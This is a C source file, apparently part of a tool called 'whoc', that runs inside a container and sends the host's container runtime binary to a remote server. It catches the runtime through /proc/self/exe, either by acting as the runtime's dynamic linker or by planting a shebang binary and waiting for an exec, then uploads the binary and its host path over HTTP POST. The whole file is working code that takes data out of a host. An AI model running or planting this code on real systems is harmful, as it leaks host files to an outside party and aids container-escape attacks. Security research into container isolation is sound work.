#include "upload_runtime.h"


void print_help(void)
{
    char * help_format = \
"Usage: upload_runtime [options] <server_ip>\n\n"
"Options:\n"
" -p, --port                 Port of remote server, defaults to %d\n"
" -e, --exec                 Wait-for-exec mode for static container runtimes, wait until an exec to the container occurred\n"
" -b, --exec-bin             In exec mode, overrides the default binary created for the exec, default is %s\n"
" -a, --exec-extra-argument  In exec mode, pass an additional argument to the runtime so it won't exit quickly\n"
" -r, --exec-readdir-proc    In exec mode, instead of guessing the runtime pid (which gives whoc one shot of catching the runtime),\n"
"                            find the runtime by searching for new processes under '/proc'.\n";
    printf(help_format, DEFAULT_PORT, DEFAULT_EXEC_BIN);
}


int parse_arguments(config * conf, int argc, char const *argv[])
{
    int opt;
    while ((opt = getopt_long(argc, (char * const*)argv, "b:p:a:er", long_options, NULL)) != -1)
    {
        switch (opt) 
        {
            case 'p':
                conf->port = atoi(optarg);
                break;
            case 'e':
                conf->wait_for_exec = true;
                break;
            case 'a':
                conf->exec_extra_arg = optarg;
                break;
            case 'b':
                conf->exec_bin = optarg;
                break;
            case 'r':
                conf->exec_readdir_mode = true;
                break;
            default: /* '?' */
                print_help();
                return 1;
        }
    }
    if (optind >= argc) 
    {
        print_help();
        return 1;
    }
    conf->server_ip = argv[optind];
    return 0;

}


bool send_post_file_http_header(int sockfd, const char * server_ip, unsigned long long file_size, const char * filename)
{
    char header[HEADER_BUF_SIZE];
    char * header_format;
    int rc;

    if (filename != NULL)
    {
        header_format =
          "POST / HTTP/1.1\r\n"
          "Host: %s\r\n"
          "Content-Type: application/octet-stream\r\n"
          "Content-Length: %llu\r\n" 
          "Content-Disposition: attachment; filename=\"%s\"\r\n"
          "Connection: close\r\n"
          "\r\n";

        rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size, filename);
    }
    else
    {
        header_format =
          "POST / HTTP/1.1\r\n"
          "Host: %s\r\n"
          "Content-Type: application/octet-stream\r\n"
          "Content-Length: %llu\r\n" 
          "Content-Disposition: attachment\r\n"
          "Connection: close\r\n"
          "\r\n";

        rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size);
    }

    if (rc < 0) 
    {
        printf("[!] send_http_header: snprintf(header) failed with '%s'\n", strerror(errno));
        return false;
    }
    if (rc >= HEADER_BUF_SIZE)
    {
        printf("[!] send_http_header: snprintf(header) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, HEADER_BUF_SIZE);
        return false;
    }

    return send_all(sockfd, (void *) header, (size_t) strlen(header));

}



int main(int argc, char const *argv[])
{
    int sockfd, runtime_fd = -1;
    struct stat file_info;
    char rt_hostpath_buf[SMALL_BUF_SIZE], link_buf[SMALL_BUF_SIZE];  
    char * rt_hostpath, *ctr_link_to_rt;
    int rc;

    /* Default configuration */
    config conf = {
        .server_ip = NULL, 
        .port = DEFAULT_PORT, 
        .wait_for_exec = false,
        .exec_extra_arg = NULL,
        .exec_bin = DEFAULT_EXEC_BIN,
        .exec_readdir_mode = false
    };
    if (parse_arguments(&conf, argc, argv) != 0)
        return 1;

    /* Get a file descriptor for the container runtime, and a link to the runtime's path on the host */
    if (!conf.wait_for_exec)
    {
        // Running as the dynamic linker of the runtime process, so the runtime should be accessible at /proc/self/exe
        ctr_link_to_rt = "/proc/self/exe";  
        runtime_fd = open(ctr_link_to_rt, O_RDONLY); 
        if (runtime_fd < 0)
        {
            printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
            return 1;
        }
    }
    else
    {   
        // Running as a normal process in the container, waiting for the runtime to exec in
        printf("[+] Running in wait-for-exec mode; preparing '%s'\n", conf.exec_bin);

        // Create an executable at conf.exec_bin containing a shebang that points to the container runtime (#!/proc/self/exe)
        if (prepare_bin_for_exec(conf.exec_bin, conf.exec_extra_arg) == false)
            return 1;  // error printed in prepare_bin_for_exec()

        // Open fd to runtime
        if (!conf.exec_readdir_mode)
            runtime_fd = catch_rt_guess_pid(conf.exec_bin);
        else
            runtime_fd = catch_rt_getdents_proc(conf.exec_bin);
        if (runtime_fd < 0)
            return 1;

        // The runtime process may have already exited, so we'll try to read the runtime's path from the fd we opened for it
        // Prepare /proc/self/fd/$runtime_fd
        rc = snprintf(link_buf, SMALL_BUF_SIZE, "/proc/self/fd/%d", runtime_fd);
        if (rc < 0) 
        {
            printf("[!] main: snprintf(link_buf) failed with '%s'\n", strerror(errno));
            goto close_runtime_ret_1;
        }
        if (rc >= SMALL_BUF_SIZE)
        {
            printf("[!] main: snprintf(link_buf) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
            goto close_runtime_ret_1;
        }
        ctr_link_to_rt = link_buf;
    }

    /* Get container runtime size */
    if(fstat(runtime_fd, &file_info) != 0)
    {
        printf("[!] upload_file: fstat(fp) failed with '%s'\n", strerror(errno));
        goto close_runtime_ret_1;
    }
    /* Try to get the runtime's path on the host */
    rc = readlink(ctr_link_to_rt, rt_hostpath_buf, SMALL_BUF_SIZE);
    if (rc < 0)
    {
        printf("[!] main: readlink(ctr_link_to_rt) failed with '%s', continuing without the runtime's path\n", strerror(errno));
        rt_hostpath = NULL;
    }
    else
    {
        rt_hostpath_buf[rc] = 0;
        rt_hostpath = rt_hostpath_buf;
    }

    printf("[+] Uploading...\n");

    /* connect to server */
    sockfd = connect_to_server(conf.server_ip, conf.port, SEND_TIMEOUT, RECV_TIMEOUT);
    if (sockfd < 0)
        goto close_runtime_ret_1;

    /* send http POST request header */
    if (send_post_file_http_header(sockfd, conf.server_ip, (unsigned long long)file_info.st_size, rt_hostpath) == false)
        goto close_both_ret_1;

    /* send container runtime to server */
    if (sendfile_all(sockfd, runtime_fd, (size_t)file_info.st_size) == false)
        goto close_both_ret_1;

    printf("[+] Done\n");
    return 0;

close_both_ret_1:
    close(sockfd);
close_runtime_ret_1:
    close(runtime_fd); 
    return 1;
}
